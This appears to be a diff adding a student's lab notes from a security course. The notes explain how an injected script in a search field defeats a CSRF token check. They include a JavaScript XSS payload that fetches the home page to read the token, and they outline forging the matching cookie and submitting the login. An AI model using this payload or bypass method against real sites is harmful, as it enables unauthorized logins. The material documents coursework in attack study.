@@ -1,0 +1,55 @@
+To login with csrf_token check in place we sought to inject code that would first go to the home page, 
+read token value from the returned form, create a cookie with this token value and finally submit 
+the login form. 
+
+Where to inject? 
+
+- Username/password fields were not useful for injection. Returned <<Invalid username>> / <<forbidden>> errors 
+  even when xss_defense = 0. 
+
+-Search bar was. Managed to write the following javascript to be inserted in the query field. The following 
+ code when inserted into the search bar sends a GET request to home page and displays response in console 
+ and alerts it. Notice the csrf_token tag returned in the form. 
+
+
+<script> 
+
+				var a; 
+
+				var xhr = new XMLHttpRequest();
+				xhr.open("GET", "http://cos432.org/project6?csrfdefense=1&xssdefense=0", false);
+				xhr.onload = function (e) {
+				  if (xhr.readyState === 4) {
+				    if (xhr.status === 200) {
+				      a = xhr.responseText; 
+
+				      console.log(a); 
+				      alert(a); 
+
+				    } else {
+				      console.error(xhr.statusText);
+
+				    }
+				  }
+				};
+				xhr.onerror = function (e) {
+				  console.error(xhr.statusText);
+				};
+				xhr.send(null); 
+
+
+</script> 
+
+
+The displayed text should be parsed to get the csrf_token value, [value], and create a cookie with name
+{csrf_token, value}. 
+
+Then send GET request to login page with username and password. This last step is identical to what was 
+done in 2.0. The login goes through as the cookie's value corresponds to the form's csrf_token value. 
+
+This entire procedure would be the injected text into the search bar. 
+
+
+Issue: One issue we faced is that when we attempted to submit the above query into the search page through
+a GET request, it failed. The reaosn was because the injected code was too large. When inputted directly 
+into the search bar the code ran. 
